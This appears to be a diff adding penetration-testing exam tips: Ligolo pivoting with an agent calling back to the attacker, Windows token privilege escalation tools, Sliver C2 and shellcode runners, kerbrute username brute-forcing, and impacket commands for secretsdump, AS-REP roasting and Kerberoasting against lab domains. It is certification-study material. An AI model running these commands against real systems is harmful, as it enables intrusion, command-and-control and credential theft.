@@ -1,0 +1,81 @@
+Tip #1: Use Ligolo for pivoting.
+
+Everything I learned about ligolo-ng, I found here: https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/
+
+	1. Make a new network device.
+		sudo ip tuntap add user root mode tun ligolo
+		sudo ip link set ligolo up
+	2. On your Attack Box run the Ligolo proxy.
+		sudo ./proxy -selfcert
+	3. Pull the Ligolo agent onto the victim computer and connect to the proxy.
+		sudo ./agent.exe -connect <my_ip>:11601 -ignore-cert
+	4. Add the internal route from your victim to your routing tables.
+		ip route add <internal_subnet>/24 dev ligolo
+	5. Confirm the route.
+		ip route list
+	6. Use the session command in the proxy and select your agent.
+	7. Press start
+
+Ligolo now entirely abstracts the pivoting process. The only additional thing you may have to do occurs if you want to connect back from an internal machine to your attack box. In that case, you can add a listener to forward ports in the Ligolo proxy.
+
+Tip #2: For Windows privilege escalation, token manipulation is frequent low hanging-fruit.
+	Run 'whoami /priv' and read this article: https://github.com/b4rdia/HackTricks/blob/master/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens/README.md
+	
+	If you see SeImpersonatePrivilege or SeAssignPrimary token, you are ADMIN. Use the PrintSpoofer, SweetPotato, or GodPotato tools I included in the privesc folder. YMMW for which tool you need to use depending on the patch of Windows.
+
+3. Tip #3: If you are stumped on Linux Privesc, run pspy64. 
+
+	pspy64 monitors all file system activity and let's you know when a file system access occurs. Just pull the binary onto your victim and run it. It helped me find hidden privesc vectors. 
+
+4. Tip #4: Use sliver as your C2 framework.
+
+	Run sudo apt-get install sliver-server.
+
+	Read Chapters 01,02,03,08,and 12 of this tutorial https://dominicbreuker.com/post/learning_sliver_c2_01_installation/
+
+	Use and abuse the sliver-armory: https://sliver.sh/docs?name=Armory
+	
+	You can extend sliver to let you run Post Exploitation tools like SharpHound and Rubeus from your implant shell. Massive time saver.
+
+	The only downside of using sliver implants vs. MSFvenom is that there are far fewer format that Sliver can automatically generate. I used this repo:
+https://github.com/chvancooten/OSEP-Code-Snippets to get code snippets for shell code runners. I then would have sliver generate shellcode instead of an exe. Then, I can just compile my own DLL or whatever with the shellcode.
+
+Tip #5: If you absolutely can't get a foothold in an AD environment, use kerbrute to bruteforce usernames.
+
+	I included the tool in the AD folder.
+
+	./kerbrute_linux_amd64 userenum -d vintage.htb --dc $IP ~/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+	
+	This uses kerberos to bruteforce usernames. OffSec likes doing dumb stuff like have the password be the username, so after you get usernames, you cantry that.
+
+Tip #6:
+	Impacket and NXC are your friends. They can essentially singlehandely pwn an AD environment.
+
+	Read the https://www.netexec.wiki/ docs. 
+
+	Here are some common impacket commands. psexec and wmiexec are also pretty baller.
+
+	SECRETS-DUMP:
+	impacket-secretsdump -hashes :9ddb6f4d9d01fedeb4bccfb09df1b39d -just-dc resourced.local/RESOURCEDC\$:@$IP
+	impacket-secretsdump -security security.save -system system.save -sam SAM -ntds NTDS LOCAL
+
+	ASREP ROAST:
+	# users list dynamically queried with an LDAP anonymous bind
+	GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
+
+	# with a users file
+	GetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
+
+	# users list dynamically queried with a LDAP authenticated bind (password)
+	GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
+
+	# users list dynamically queried with a LDAP authenticated bind (NT hash)
+	GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
+
+	KERBEROAST:
+	# with a password
+	GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
+
+	# with an NT hash
+	GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
+
